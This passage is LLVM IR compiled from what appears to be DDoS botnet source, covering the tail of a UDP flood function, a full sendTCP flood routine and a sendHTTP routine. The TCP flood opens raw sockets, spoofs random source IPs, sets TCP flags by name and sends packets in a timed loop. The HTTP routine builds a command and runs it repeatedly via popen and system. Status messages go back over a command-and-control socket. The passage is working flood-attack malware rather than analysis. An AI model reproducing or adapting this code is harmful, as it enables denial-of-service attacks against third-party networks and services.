  %196 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %195, i32 0, i32 3
  store i16 0, i16* %196, align 2
  %197 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %198 = bitcast %struct.udphdr* %197 to i8*
  %199 = getelementptr inbounds i8, i8* %198, i64 8
  %200 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* noundef %199, i32 noundef %200)
  %201 = bitcast i8* %145 to i16*
  %202 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 2
  %204 = load i16, i16* %203, align 2
  %205 = zext i16 %204 to i32
  %206 = call zeroext i16 @csum(i16* noundef %201, i32 noundef %205)
  %207 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 7
  store i16 %206, i16* %208, align 2
  %209 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %210 = load i32, i32* %9, align 4
  %211 = add nsw i32 %209, %210
  store i32 %211, i32* %27, align 4
  store i32 0, i32* %28, align 4
  br label %212

212:                                              ; preds = %265, %264, %186
  br label %213

213:                                              ; preds = %212
  %214 = load i32, i32* %19, align 4
  %215 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %216 = call i64 @sendto(i32 noundef %214, i8* noundef %145, i64 noundef %143, i32 noundef 0, %struct.sockaddr* noundef %215, i32 noundef 16)
  %217 = call i32 @rand_cmwc()
  %218 = trunc i32 %217 to i16
  %219 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %220 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %219, i32 0, i32 0
  %221 = bitcast %union.anon.2* %220 to %struct.anon.3*
  %222 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %221, i32 0, i32 0
  store i16 %218, i16* %222, align 2
  %223 = load i32, i32* %8, align 4
  %224 = icmp eq i32 %223, 0
  br i1 %224, label %225, label %227

225:                                              ; preds = %213
  %226 = call i32 @rand_cmwc()
  br label %232

227:                                              ; preds = %213
  %228 = load i32, i32* %8, align 4
  %229 = trunc i32 %228 to i16
  %230 = call zeroext i16 @htons(i16 noundef zeroext %229) #15
  %231 = zext i16 %230 to i32
  br label %232

232:                                              ; preds = %227, %225
  %233 = phi i32 [ %226, %225 ], [ %231, %227 ]
  %234 = trunc i32 %233 to i16
  %235 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %236 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %235, i32 0, i32 0
  %237 = bitcast %union.anon.2* %236 to %struct.anon.3*
  %238 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %237, i32 0, i32 1
  store i16 %234, i16* %238, align 2
  %239 = call i32 @rand_cmwc()
  %240 = trunc i32 %239 to i16
  %241 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %242 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %241, i32 0, i32 3
  store i16 %240, i16* %242, align 4
  %243 = load i32, i32* %22, align 4
  %244 = call i32 @getRandomIP(i32 noundef %243)
  %245 = call i32 @htonl(i32 noundef %244) #15
  %246 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %247 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %246, i32 0, i32 8
  store i32 %245, i32* %247, align 4
  %248 = bitcast i8* %145 to i16*
  %249 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %250 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %249, i32 0, i32 2
  %251 = load i16, i16* %250, align 2
  %252 = zext i16 %251 to i32
  %253 = call zeroext i16 @csum(i16* noundef %248, i32 noundef %252)
  %254 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %255 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %254, i32 0, i32 7
  store i16 %253, i16* %255, align 2
  %256 = load i32, i32* %28, align 4
  %257 = load i32, i32* %14, align 4
  %258 = icmp eq i32 %256, %257
  br i1 %258, label %259, label %265

259:                                              ; preds = %232
  %260 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %261 = load i32, i32* %27, align 4
  %262 = icmp sgt i32 %260, %261
  br i1 %262, label %263, label %264

263:                                              ; preds = %259
  br label %268

264:                                              ; preds = %259
  store i32 0, i32* %28, align 4
  br label %212

265:                                              ; preds = %232
  %266 = load i32, i32* %28, align 4
  %267 = add i32 %266, 1
  store i32 %267, i32* %28, align 4
  br label %212

268:                                              ; preds = %263
  %269 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %269)
  br label %270

270:                                              ; preds = %268, %117, %109, %104, %67, %57, %46
  ret void
}

declare i64 @sendto(i32 noundef, i8* noundef, i64 noundef, i32 noundef, %struct.sockaddr* noundef, i32 noundef) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32 noundef, i32 noundef, i32 noundef, i8* noundef, i32 noundef) #4

; Function Attrs: nounwind
declare void @srand(i32 noundef) #4

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32 noundef) #8

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @sendTCP(i8* noundef %0, i32 noundef %1, i32 noundef %2, i32 noundef %3, i8* noundef %4, i32 noundef %5, i32 noundef %6) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i64, align 8
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.tcphdr*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %27 = load i32, i32* %14, align 4
  store i32 %27, i32* %15, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %9, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

31:                                               ; preds = %7
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

35:                                               ; preds = %7
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 noundef zeroext %37) #15
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

40:                                               ; preds = %35, %31
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* noundef %41, %struct.in_addr* noundef %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

45:                                               ; preds = %40
  br label %340

46:                                               ; preds = %40
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %48, i8 0, i64 8, i1 false)
  %49 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #12
  store i32 %49, i32* %17, align 4
  %50 = load i32, i32* %17, align 4
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %55, label %52

52:                                               ; preds = %46
  %53 = load i32, i32* @mainCommSock, align 4
  %54 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %53, i8* noundef getelementptr inbounds ([27 x i8], [27 x i8]* @.str.45, i64 0, i64 0))
  br label %340

55:                                               ; preds = %46
  store i32 1, i32* %18, align 4
  %56 = load i32, i32* %17, align 4
  %57 = bitcast i32* %18 to i8*
  %58 = call i32 @setsockopt(i32 noundef %56, i32 noundef 0, i32 noundef 3, i8* noundef %57, i32 noundef 4) #12
  %59 = icmp slt i32 %58, 0
  br i1 %59, label %60, label %63

60:                                               ; preds = %55
  %61 = load i32, i32* @mainCommSock, align 4
  %62 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %61, i8* noundef getelementptr inbounds ([33 x i8], [33 x i8]* @.str.46, i64 0, i64 0))
  br label %340

63:                                               ; preds = %55
  %64 = load i32, i32* %11, align 4
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %66, label %67

66:                                               ; preds = %63
  store i32 0, i32* %19, align 4
  br label %73

67:                                               ; preds = %63
  %68 = load i32, i32* %11, align 4
  %69 = sub nsw i32 32, %68
  %70 = shl i32 1, %69
  %71 = sub nsw i32 %70, 1
  %72 = xor i32 %71, -1
  store i32 %72, i32* %19, align 4
  br label %73

73:                                               ; preds = %67, %66
  %74 = load i32, i32* %13, align 4
  %75 = sext i32 %74 to i64
  %76 = add i64 40, %75
  %77 = call i8* @llvm.stacksave()
  store i8* %77, i8** %20, align 8
  %78 = alloca i8, i64 %76, align 16
  store i64 %76, i64* %21, align 8
  %79 = bitcast i8* %78 to %struct.iphdr*
  store %struct.iphdr* %79, %struct.iphdr** %22, align 8
  %80 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %81 = bitcast %struct.iphdr* %80 to i8*
  %82 = getelementptr i8, i8* %81, i64 20
  %83 = bitcast i8* %82 to %struct.tcphdr*
  store %struct.tcphdr* %83, %struct.tcphdr** %23, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %85 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %86 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %85, i32 0, i32 0
  %87 = load i32, i32* %86, align 4
  %88 = load i32, i32* %19, align 4
  %89 = call i32 @getRandomIP(i32 noundef %88)
  %90 = call i32 @htonl(i32 noundef %89) #15
  %91 = load i32, i32* %13, align 4
  %92 = sext i32 %91 to i64
  %93 = add i64 20, %92
  %94 = trunc i64 %93 to i32
  call void @makeIPPacket(%struct.iphdr* noundef %84, i32 noundef %87, i32 noundef %90, i8 noundef zeroext 6, i32 noundef %94)
  %95 = call i32 @rand_cmwc()
  %96 = trunc i32 %95 to i16
  %97 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %98 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %97, i32 0, i32 0
  %99 = bitcast %union.anon* %98 to %struct.anon.0*
  %100 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %99, i32 0, i32 0
  store i16 %96, i16* %100, align 4
  %101 = call i32 @rand_cmwc()
  %102 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %103 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %102, i32 0, i32 0
  %104 = bitcast %union.anon* %103 to %struct.anon.0*
  %105 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %104, i32 0, i32 2
  store i32 %101, i32* %105, align 4
  %106 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon* %107 to %struct.anon.0*
  %109 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %108, i32 0, i32 3
  store i32 0, i32* %109, align 4
  %110 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 0
  %112 = bitcast %union.anon* %111 to %struct.anon.0*
  %113 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %112, i32 0, i32 4
  %114 = load i16, i16* %113, align 4
  %115 = and i16 %114, -241
  %116 = or i16 %115, 80
  store i16 %116, i16* %113, align 4
  %117 = load i8*, i8** %12, align 8
  %118 = call i32 @strcmp(i8* noundef %117, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.47, i64 0, i64 0)) #11
  %119 = icmp ne i32 %118, 0
  br i1 %119, label %156, label %120

120:                                              ; preds = %73
  %121 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %122 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %121, i32 0, i32 0
  %123 = bitcast %union.anon* %122 to %struct.anon.0*
  %124 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %123, i32 0, i32 4
  %125 = load i16, i16* %124, align 4
  %126 = and i16 %125, -513
  %127 = or i16 %126, 512
  store i16 %127, i16* %124, align 4
  %128 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i32 0, i32 0
  %130 = bitcast %union.anon* %129 to %struct.anon.0*
  %131 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %130, i32 0, i32 4
  %132 = load i16, i16* %131, align 4
  %133 = and i16 %132, -1025
  %134 = or i16 %133, 1024
  store i16 %134, i16* %131, align 4
  %135 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %136 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %135, i32 0, i32 0
  %137 = bitcast %union.anon* %136 to %struct.anon.0*
  %138 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %137, i32 0, i32 4
  %139 = load i16, i16* %138, align 4
  %140 = and i16 %139, -257
  %141 = or i16 %140, 256
  store i16 %141, i16* %138, align 4
  %142 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %143 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %142, i32 0, i32 0
  %144 = bitcast %union.anon* %143 to %struct.anon.0*
  %145 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %144, i32 0, i32 4
  %146 = load i16, i16* %145, align 4
  %147 = and i16 %146, -4097
  %148 = or i16 %147, 4096
  store i16 %148, i16* %145, align 4
  %149 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %150 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %149, i32 0, i32 0
  %151 = bitcast %union.anon* %150 to %struct.anon.0*
  %152 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %151, i32 0, i32 4
  %153 = load i16, i16* %152, align 4
  %154 = and i16 %153, -2049
  %155 = or i16 %154, 2048
  store i16 %155, i16* %152, align 4
  br label %233

156:                                              ; preds = %73
  %157 = load i8*, i8** %12, align 8
  %158 = call i8* @strtok(i8* noundef %157, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i64 0, i64 0)) #12
  store i8* %158, i8** %24, align 8
  br label %159

159:                                              ; preds = %230, %156
  %160 = load i8*, i8** %24, align 8
  %161 = icmp ne i8* %160, null
  br i1 %161, label %162, label %232

162:                                              ; preds = %159
  %163 = load i8*, i8** %24, align 8
  %164 = call i32 @strcmp(i8* noundef %163, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.49, i64 0, i64 0)) #11
  %165 = icmp ne i32 %164, 0
  br i1 %165, label %174, label %166

166:                                              ; preds = %162
  %167 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %168 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %167, i32 0, i32 0
  %169 = bitcast %union.anon* %168 to %struct.anon.0*
  %170 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %169, i32 0, i32 4
  %171 = load i16, i16* %170, align 4
  %172 = and i16 %171, -513
  %173 = or i16 %172, 512
  store i16 %173, i16* %170, align 4
  br label %230

174:                                              ; preds = %162
  %175 = load i8*, i8** %24, align 8
  %176 = call i32 @strcmp(i8* noundef %175, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.50, i64 0, i64 0)) #11
  %177 = icmp ne i32 %176, 0
  br i1 %177, label %186, label %178

178:                                              ; preds = %174
  %179 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %180 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %179, i32 0, i32 0
  %181 = bitcast %union.anon* %180 to %struct.anon.0*
  %182 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %181, i32 0, i32 4
  %183 = load i16, i16* %182, align 4
  %184 = and i16 %183, -1025
  %185 = or i16 %184, 1024
  store i16 %185, i16* %182, align 4
  br label %229

186:                                              ; preds = %174
  %187 = load i8*, i8** %24, align 8
  %188 = call i32 @strcmp(i8* noundef %187, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.51, i64 0, i64 0)) #11
  %189 = icmp ne i32 %188, 0
  br i1 %189, label %198, label %190

190:                                              ; preds = %186
  %191 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %192 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %191, i32 0, i32 0
  %193 = bitcast %union.anon* %192 to %struct.anon.0*
  %194 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %193, i32 0, i32 4
  %195 = load i16, i16* %194, align 4
  %196 = and i16 %195, -257
  %197 = or i16 %196, 256
  store i16 %197, i16* %194, align 4
  br label %228

198:                                              ; preds = %186
  %199 = load i8*, i8** %24, align 8
  %200 = call i32 @strcmp(i8* noundef %199, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.52, i64 0, i64 0)) #11
  %201 = icmp ne i32 %200, 0
  br i1 %201, label %210, label %202

202:                                              ; preds = %198
  %203 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %204 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %203, i32 0, i32 0
  %205 = bitcast %union.anon* %204 to %struct.anon.0*
  %206 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %205, i32 0, i32 4
  %207 = load i16, i16* %206, align 4
  %208 = and i16 %207, -4097
  %209 = or i16 %208, 4096
  store i16 %209, i16* %206, align 4
  br label %227

210:                                              ; preds = %198
  %211 = load i8*, i8** %24, align 8
  %212 = call i32 @strcmp(i8* noundef %211, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.53, i64 0, i64 0)) #11
  %213 = icmp ne i32 %212, 0
  br i1 %213, label %222, label %214

214:                                              ; preds = %210
  %215 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %216 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %215, i32 0, i32 0
  %217 = bitcast %union.anon* %216 to %struct.anon.0*
  %218 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %217, i32 0, i32 4
  %219 = load i16, i16* %218, align 4
  %220 = and i16 %219, -2049
  %221 = or i16 %220, 2048
  store i16 %221, i16* %218, align 4
  br label %226

222:                                              ; preds = %210
  %223 = load i32, i32* @mainCommSock, align 4
  %224 = load i8*, i8** %24, align 8
  %225 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %223, i8* noundef getelementptr inbounds ([18 x i8], [18 x i8]* @.str.54, i64 0, i64 0), i8* noundef %224)
  br label %226

226:                                              ; preds = %222, %214
  br label %227

227:                                              ; preds = %226, %202
  br label %228

228:                                              ; preds = %227, %190
  br label %229

229:                                              ; preds = %228, %178
  br label %230

230:                                              ; preds = %229, %166
  %231 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i64 0, i64 0)) #12
  store i8* %231, i8** %24, align 8
  br label %159, !llvm.loop !48

232:                                              ; preds = %159
  br label %233

233:                                              ; preds = %232, %120
  %234 = call i32 @rand_cmwc()
  %235 = trunc i32 %234 to i16
  %236 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 0
  %238 = bitcast %union.anon* %237 to %struct.anon.0*
  %239 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %238, i32 0, i32 5
  store i16 %235, i16* %239, align 2
  %240 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 0
  %242 = bitcast %union.anon* %241 to %struct.anon.0*
  %243 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %242, i32 0, i32 6
  store i16 0, i16* %243, align 4
  %244 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 0
  %246 = bitcast %union.anon* %245 to %struct.anon.0*
  %247 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %246, i32 0, i32 7
  store i16 0, i16* %247, align 2
  %248 = load i32, i32* %9, align 4
  %249 = icmp eq i32 %248, 0
  br i1 %249, label %250, label %252

250:                                              ; preds = %233
  %251 = call i32 @rand_cmwc()
  br label %257

252:                                              ; preds = %233
  %253 = load i32, i32* %9, align 4
  %254 = trunc i32 %253 to i16
  %255 = call zeroext i16 @htons(i16 noundef zeroext %254) #15
  %256 = zext i16 %255 to i32
  br label %257

257:                                              ; preds = %252, %250
  %258 = phi i32 [ %251, %250 ], [ %256, %252 ]
  %259 = trunc i32 %258 to i16
  %260 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %261 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %260, i32 0, i32 0
  %262 = bitcast %union.anon* %261 to %struct.anon.0*
  %263 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %262, i32 0, i32 1
  store i16 %259, i16* %263, align 2
  %264 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %265 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %266 = call zeroext i16 @tcpcsum(%struct.iphdr* noundef %264, %struct.tcphdr* noundef %265)
  %267 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %268 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %267, i32 0, i32 0
  %269 = bitcast %union.anon* %268 to %struct.anon.0*
  %270 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %269, i32 0, i32 6
  store i16 %266, i16* %270, align 4
  %271 = bitcast i8* %78 to i16*
  %272 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %273 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %272, i32 0, i32 2
  %274 = load i16, i16* %273, align 2
  %275 = zext i16 %274 to i32
  %276 = call zeroext i16 @csum(i16* noundef %271, i32 noundef %275)
  %277 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i32 0, i32 7
  store i16 %276, i16* %278, align 2
  %279 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %280 = load i32, i32* %10, align 4
  %281 = add nsw i32 %279, %280
  store i32 %281, i32* %25, align 4
  store i32 0, i32* %26, align 4
  br label %282

282:                                              ; preds = %335, %334, %257
  br label %283

283:                                              ; preds = %282
  %284 = load i32, i32* %17, align 4
  %285 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %286 = call i64 @sendto(i32 noundef %284, i8* noundef %78, i64 noundef %76, i32 noundef 0, %struct.sockaddr* noundef %285, i32 noundef 16)
  %287 = load i32, i32* %19, align 4
  %288 = call i32 @getRandomIP(i32 noundef %287)
  %289 = call i32 @htonl(i32 noundef %288) #15
  %290 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i32 0, i32 8
  store i32 %289, i32* %291, align 4
  %292 = call i32 @rand_cmwc()
  %293 = trunc i32 %292 to i16
  %294 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %295 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %294, i32 0, i32 3
  store i16 %293, i16* %295, align 4
  %296 = call i32 @rand_cmwc()
  %297 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %298 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %297, i32 0, i32 0
  %299 = bitcast %union.anon* %298 to %struct.anon.0*
  %300 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %299, i32 0, i32 2
  store i32 %296, i32* %300, align 4
  %301 = call i32 @rand_cmwc()
  %302 = trunc i32 %301 to i16
  %303 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %304 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %303, i32 0, i32 0
  %305 = bitcast %union.anon* %304 to %struct.anon.0*
  %306 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %305, i32 0, i32 0
  store i16 %302, i16* %306, align 4
  %307 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %308 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %307, i32 0, i32 0
  %309 = bitcast %union.anon* %308 to %struct.anon.0*
  %310 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %309, i32 0, i32 6
  store i16 0, i16* %310, align 4
  %311 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %312 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %313 = call zeroext i16 @tcpcsum(%struct.iphdr* noundef %311, %struct.tcphdr* noundef %312)
  %314 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 0
  %316 = bitcast %union.anon* %315 to %struct.anon.0*
  %317 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %316, i32 0, i32 6
  store i16 %313, i16* %317, align 4
  %318 = bitcast i8* %78 to i16*
  %319 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %320 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %319, i32 0, i32 2
  %321 = load i16, i16* %320, align 2
  %322 = zext i16 %321 to i32
  %323 = call zeroext i16 @csum(i16* noundef %318, i32 noundef %322)
  %324 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %325 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %324, i32 0, i32 7
  store i16 %323, i16* %325, align 2
  %326 = load i32, i32* %26, align 4
  %327 = load i32, i32* %15, align 4
  %328 = icmp eq i32 %326, %327
  br i1 %328, label %329, label %335

329:                                              ; preds = %283
  %330 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %331 = load i32, i32* %25, align 4
  %332 = icmp sgt i32 %330, %331
  br i1 %332, label %333, label %334

333:                                              ; preds = %329
  br label %338

334:                                              ; preds = %329
  store i32 0, i32* %26, align 4
  br label %282

335:                                              ; preds = %283
  %336 = load i32, i32* %26, align 4
  %337 = add i32 %336, 1
  store i32 %337, i32* %26, align 4
  br label %282

338:                                              ; preds = %333
  %339 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %339)
  br label %340

340:                                              ; preds = %338, %60, %52, %45
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8* noundef, i8* noundef) #1

; Function Attrs: nounwind
declare i8* @strtok(i8* noundef, i8* noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @sendHTTP(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct._IO_FILE*, align 8
  %7 = alloca [80 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %8 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %9 = load i32, i32* %4, align 4
  %10 = add nsw i32 %8, %9
  store i32 %10, i32* %5, align 4
  %11 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i64 0, i64 0
  %12 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %11, i8* noundef getelementptr inbounds ([17 x i8], [17 x i8]* @.str.55, i64 0, i64 0)) #12
  %13 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i64 0, i64 0
  %14 = load i8*, i8** %3, align 8
  %15 = call i8* @strcat(i8* noundef %13, i8* noundef %14) #12
  %16 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i64 0, i64 0
  %17 = call i8* @strcat(i8* noundef %16, i8* noundef getelementptr inbounds ([14 x i8], [14 x i8]* @.str.56, i64 0, i64 0)) #12
  %18 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i64 0, i64 0
  %19 = call noalias %struct._IO_FILE* @popen(i8* noundef %18, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.57, i64 0, i64 0))
  store %struct._IO_FILE* %19, %struct._IO_FILE** %6, align 8
  br label %20

20:                                               ; preds = %24, %2
  %21 = load i32, i32* %5, align 4
  %22 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %23 = icmp sgt i32 %21, %22
  br i1 %23, label %24, label %27

24:                                               ; preds = %20
  %25 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i64 0, i64 0
  %26 = call i32 @system(i8* noundef %25)
  br label %20, !llvm.loop !49

27:                                               ; preds = %20
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8* noundef, i8* noundef, ...) #4

; Function Attrs: nounwind
declare i8* @strcat(i8* noundef, i8* noundef) #4

declare noalias %struct._IO_FILE* @popen(i8* noundef, i8* noundef) #3

declare i32 @system(i8* noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
